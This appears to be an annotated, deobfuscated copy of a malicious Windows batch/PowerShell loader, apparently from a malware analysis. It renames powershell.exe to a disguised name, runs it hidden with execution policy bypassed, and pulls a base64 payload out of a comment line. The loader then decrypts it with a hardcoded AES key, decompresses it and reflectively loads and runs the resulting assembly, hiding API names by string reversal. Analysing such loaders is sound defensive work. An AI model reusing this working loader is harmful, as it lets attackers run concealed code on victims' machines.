:: copy powershell.exe to mudm1.bat.exe
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "C:\Users\username\Downloads\nudm1.bat.exe"

:: move to the new "masqueraded" powershell.exe path
cd "C:\\Users\\username\\Downloads\\" "nudm1.bat.exe" -noprofile -windowstyle hidden -ep bypass -command 

:: PowerShell code ran by renamed powershell.exe

:: revtext -> ReadAllText. reads the contents of nudm1.bat and stores it in batContents
$batContents = [System.IO.File]::("txeTllAdaeR"[-1..-11] -join '') ("C:\Users\username\Downloads\nudm1.bat").Split([Environment]::NewLine);

:: look for 
foreach ($line in $batContents) { 
    if ($line.StartsWith(':: ')) {  
        $payload = $line.Substring(3); 
        break;
    };
};

:: revtext -> FromBase64String
$revText2 = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($payload);

:: create an AES object
$AESObj = New-Object System.Security.Cryptography.AesManaged;
$AESObj.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$AESObj.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
:: key =  E0 ED A1 30 1F 69 31 C8 54 D1 66 6A C0 EC 48 FF 8C 20 DF F4 2C 99 81 25 92 D8 80 9F 00 F8 2E AC
$AESObj.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('4O2hMB9pMchU0WZqwOxI/4wg3/QsmYElktiAnwD4Lqw=');
:: IV = 4C 57 F1 3C 05 66 50 95 F0 D6 3F BE 75 C4 9F B1
$AESObj.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('TFfxPAVmUJXw1j++dcSfsQ==');

:: create a decryptor for AES
$AESDecryptor = $AESObj.CreateDecryptor();

:: decrypt payload
$revText2 = $AESDecryptor.TransformFinalBlock($revText2, 0, $revText2.Length);

:: cleanup
$AESDecryptor.Dispose();
$AESObj.Dispose();

:: decompress a gziped file
$memStream1 = New-Object System.IO.MemoryStream(, $revText2);
$memStream2 = New-Object System.IO.MemoryStream;
$gzipStream = New-Object System.IO.Compression.GZipStream($memStream1, [IO.Compression.CompressionMode]::Decompress);
$gzipStream.CopyTo($memStream2);

:: cleanup
$gzipStream.Dispose();
$memStream1.Dispose();
$memStream2.Dispose();

:: load an assembly
$revText2 = $memStream2.ToArray();
$assem = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($revText2);
$assemEntryPoint = $assem.EntryPoint;
$assemEntryPoint.Invoke($null, (, [string[]] ('')))
